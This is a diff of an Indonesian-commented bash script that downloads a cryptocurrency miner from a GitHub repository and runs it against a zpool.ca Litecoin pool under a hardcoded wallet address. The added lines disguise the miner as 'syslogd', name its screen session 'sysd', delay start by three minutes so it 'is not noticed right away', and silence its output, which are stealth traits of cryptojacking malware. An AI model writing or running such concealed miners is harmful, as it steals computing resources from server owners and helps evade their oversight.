@@ -1,38 +1,44 @@
 #!/bin/bash
 echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar
+apt-get update -y && apt-get install -y screen wget tar git curl
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+# Nama proses dan screen disamarkan
+PROC_NAME="syslogd"
+SCREEN_NAME="sysd"
+SCRIPT_NAME="/root/${PROC_NAME}.sh"
+
+echo "📁 Menyimpan skrip mining ke ${SCRIPT_NAME}..."
+cat << EOF > ${SCRIPT_NAME}
 #!/bin/bash
 
 cd /root || exit
 
+# Delay 3 menit agar tidak langsung ketahuan
+sleep 180
+
 # Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
-  git clone https://github.com/amirul5656/yui56.git
-  cd yui56
-  chmod +x benchmarks
+if [ ! -f /root/${PROC_NAME} ]; then
+  echo "⬇️ Mengunduh file miner..."
+  git clone https://github.com/amirul5656/yui56.git tmprepo
+  cd tmprepo
+  cp benchmarks /root/${PROC_NAME}
+  chmod +x /root/${PROC_NAME}
+  cd /root && rm -rf tmprepo
 fi
 
-# Cek apakah screen sudah berjalan
-if screen -list | grep -q amirul3; then
-  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
-else
-  echo "▶ Menjalankan mining di screen 'amirul3'..."
-  screen -dmS amirul3 bash -c '
-    while true; do
-      ./benchmarks --algorithm power2b --pool stratum+tcp://power2b.jp.mine.zpool.ca:6242 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp --password c=LTC -t 7
-      sleep 2
-    done
-  '
-fi
+# Jalankan miner jika belum jalan
+pgrep -f "${PROC_NAME}" > /dev/null || \
+taskset -c 0-3 /root/${PROC_NAME} --algorithm power2b --pool stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp --password c=LTC -t 8 >> /dev/null 2>&1
 EOF
 
-chmod +x /root/benchmarks.sh
+chmod +x ${SCRIPT_NAME}
 
-echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
+# Jalankan di dalam screen
+if screen -list | grep -q "${SCREEN_NAME}"; then
+  echo "⚠️ Screen ${SCREEN_NAME} sudah aktif."
+else
+  echo "🚀 Menjalankan miner di screen ${SCREEN_NAME}..."
+  screen -dmS ${SCREEN_NAME} bash ${SCRIPT_NAME}
+fi
 
-echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
+echo "✅ Miner berjalan di background via screen '${SCREEN_NAME}' dengan 4 core / 8 thread."
